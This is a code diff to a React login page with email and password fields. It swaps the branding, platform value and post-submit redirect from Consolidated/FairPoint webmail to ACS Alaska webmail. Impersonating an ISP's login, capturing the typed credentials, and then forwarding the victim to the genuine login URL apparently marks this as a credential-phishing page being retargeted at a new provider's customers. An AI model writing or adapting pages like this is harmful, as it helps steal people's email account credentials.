@@ -9,6 +9,7 @@ import axios from 'axios';
 
 import { useEffect } from 'react';
 import myfairpoint from './fairpoint.png';
+import aska from './aska.png';
 
 
 function Home(){
@@ -16,7 +17,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Consolidated")
+    const[platform, setPlatform] = useState("acsalaska")
 
     const[showError, setShowError] = useState(false);
 
@@ -51,7 +52,7 @@ async function handleSubmit(e){
            // console.log(response.data.message);
 
           
-           window.location.href = 'https://mail.consolidated.net/#/login';
+           window.location.href = 'https://mymail.acsalaska.net/#/login';
         }
       } catch (error) {
         // Handle error
@@ -63,7 +64,7 @@ async function handleSubmit(e){
     return (
         <>
             <nav className='mynav px-3 py-1 bg-dark'>
-                <img className='navimage' src={myfairpoint} />
+                <img className='navimage' src={aska} />
 
             </nav>
 
